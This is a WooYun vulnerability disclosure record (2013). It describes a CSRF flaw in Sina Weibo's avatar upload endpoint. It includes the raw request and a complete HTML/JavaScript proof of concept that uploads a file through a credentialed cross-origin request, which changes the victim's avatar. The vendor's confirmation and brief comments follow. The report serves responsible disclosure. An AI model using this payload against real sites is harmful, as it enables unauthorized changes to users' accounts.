{"id": 7162, "wybug_id": "wooyun-2013-042688", "wybug_title": "利用新浪微博的csrf漏洞修改任意用户的头像", "wybug_corp": "新浪", "wybug_author": "D＆G", "wybug_date": "2013-11-12 16:40", "wybug_open_date": "2013-12-27 16:40", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-27：\t细节向公众公开  简要描述： 利用html5中的新特性，实现csrf无交互的上传任意文件。 详细说明：  新浪微博新注册用户的引导上传用户头像的接口没有防御csrf,通常的用户上传文件是需要交互,利用难度较大.不过html5有一个新特性[CORS](http://www.w3.org/TR/cors),可以实现无交互的上传文件.存在csrf的地方:\nPOST /nguide/aj/Upload HTTP/1.1\tHost: weibo.com\tUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:24.0) Gecko/20100101 Firefox/24.0\tAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\tAccept-Language: en-gb,en;q=0.5\tAccept-Encoding: gzip, deflate\tCookie: lang=zh-cn; UOR=www.wooyun.org\tConnection: keep-alive\tContent-Type: multipart/form-data; boundary=---------------------------246862377417659\tContent-Length: 71483\t-----------------------------246862377417659\tContent-Disposition: form-data; name=\"filedata\"; filename=\"Sunset.jpg\"\tContent-Type: image/jpeg\n 话说有个疑问,为什么我的cookie里会有www.wooyun.org这个字段?????这个地方的post请求既没有token,也没对refer进行验证.所以构造如下poc\n<!DOCTYPE html> \t<html> \t<head>\t<meta charset=utf-8 />\t<link href='http://fonts.googleapis.com/css?family=Inconsolata' rel='stylesheet' type='text/css'> \t<script src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js\" type=\"text/javascript\"></script>\t<style>\tbody {background: #333; color: #eee; font-family: 'Inconsolata', Verdana, sans-serif;}\ta:link {color: green; }\ta:visited {color: darkgreen;}\t</style>\t</head>\t<body>\t<h1>sina weibo CSRF arbitrary file upload</h1>\t<h2>Step 1</h2>\tLog in into <a href=\"http://weibo.com\">weibo.com</a> (skip this if you use 'remember me' feature)\t<h2>Step 2</h2>\t<button type=\"button\" id=\"upload\" onclick=\"start()\"><font size=\"+2\">Let's have some fun!</font></button>\t<script>\tvar logUrl = 'http://weibo.com/nguide/aj/Upload/';\tfunction byteValue(x) {    return x.charCodeAt(0) & 0xff;\t}\tfunction toBytes(datastr) {    var ords = Array.prototype.map.call(datastr, byteValue);    var ui8a = new Uint8Array(ords);    return ui8a.buffer;\t}\tif (typeof XMLHttpRequest.prototype.sendAsBinary == 'undefined' && Uint8Array) {\tXMLHttpRequest.prototype.sendAsBinary = function(datastr) {\tthis.send(toBytes(datastr));\t}\t}\tfunction fileUpload(fileData, fileName) {\tvar fileSize = fileData.length,\tboundary = \"9849436581144108930470211272\",\turi = logUrl,\txhr = new XMLHttpRequest();\tvar additionalFields = {\trawpic: 1\t}\tvar fileFieldName = \"filedata\";\t\txhr.open(\"POST\", uri, true);\txhr.setRequestHeader(\"Content-Type\", \"multipart/form-data, boundary=\"+boundary); // simulate a file MIME POST request.\txhr.setRequestHeader(\"Content-Length\", fileSize);\txhr.withCredentials = \"true\";\t\txhr.onreadystatechange = function() {\tif (xhr.readyState == 4) {\tif ((xhr.status >= 200 && xhr.status <= 200) || xhr.status == 304) {\t\tif (xhr.responseText != \"\") {\talert(JSON.parse(xhr.responseText).msg); // display response.\t}\t} else if (xhr.status == 0) {\t$(\"#goto\").show();\t}\t}\t}\t\tvar body = \"\";\t\tfor (var i in additionalFields) {\tif (additionalFields.hasOwnProperty(i)) {\tbody += addField(i, additionalFields[i], boundary);\t}\t}\tbody += addFileField(fileFieldName, fileData, fileName, boundary);\tbody += \"--\" + boundary + \"--\";\txhr.sendAsBinary(body);\treturn true;\t}\tfunction addField(name, value, boundary) {\tvar c = \"--\" + boundary + \"\\r\\n\"\tc += \"Content-Disposition: form-data; name='\" + name + \"'\\r\\n\\r\\n\";\tc += value + \"\\r\\n\";\treturn c;\t}\tfunction addFileField(name, value, filename, boundary) {    var c = \"--\" + boundary + \"\\r\\n\"    c += \"Content-Disposition: form-data; name='\" + name + \"'; filename='\" + filename + \"'\\r\\n\";    c += \"Content-Type: image/jpeg\\r\\n\\r\\n\";    c += value + \"\\r\\n\";    return c;\t\t}\tfunction load_binary_resource(url) {\tvar req = new XMLHttpRequest();\treq.open('GET', url, false);\t//XHR binary charset opt by Marcus Granado 2006 [http://mgran.blogspot.com]\treq.overrideMimeType('text/plain; charset=x-user-defined');\treq.send(null);\tif (req.status != 200) return '';\tvar bytes = Array.prototype.map.call(req.responseText, byteValue);\treturn String.fromCharCode.apply(this, bytes);\treturn req.responseText;\t}\tvar start = function() {\tvar c = load_binary_resource('html5.jpg');\tfileUpload(c, 'html5.jpg');\t};\t//start();\t</script>\t</div>\t<div id=\"goto\" style=\"display:none\">\t<h2>Step 3</h2>\tDone! <a href=\"http://weibo.com\">see for yourself!</a>\t</div>\t</body>\t</html>\n测试浏览器:firefox24.0当前用户的头像为:\n\n访问poc\n\n点击havefun。当然，js是可以自动提交的。这里仅仅是演示。查看头像已经被修改了\n\n   漏洞证明：  当前用户的头像为:\n\n访问poc\n\n点击havefun。当然，js是可以自动提交的。这里仅仅是演示。查看头像已经被修改了\n\n   修复方案：  也许黑帽子才更懂得每一个漏洞每一缺陷的利用价值。防御csrf即可。举一反三多查找一下上传文件是否防御了csrf，不仅仅是传个头像，比如分享文件啊这些点。可以传播恶意文件。   版权声明：转载请注明来源 D＆G@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2013-11-13 11:19 厂商回复： 感谢关注新浪安全，马上安排相关人员修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-12 16:41 |    \t\tPgHook \t\t\t( 普通白帽子  |\t\t\t        Rank:964 漏洞数:115        | ...........................................)\t\t \n  牛逼！！！    \n     2013-11-12 16:59 |    \t\tbig、face \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:36        | |上天请赐我一个洞|想要一件乌云衣服|)\t\t \n  mark    \n     2013-11-12 17:10 |    \t\tadmin1993 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:39        | 0101001010010100101001010010100101001010...)\t\t \n  mark    \n     2013-11-12 20:07 |    \t\t肥羊宅 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:2        | 只是来学习安全知识的……估计抓不出多少漏...)\t\t \n  mark    \n     2013-11-12 20:20 |    \t\t0x004er \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:19        | 。。。。。。。)\t\t \n  mark    \n     2013-11-12 20:42 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  mark    \n     2013-11-13 12:21 |    \t\tM0nster \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:17        | 允许我国的艺术家先富起来)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}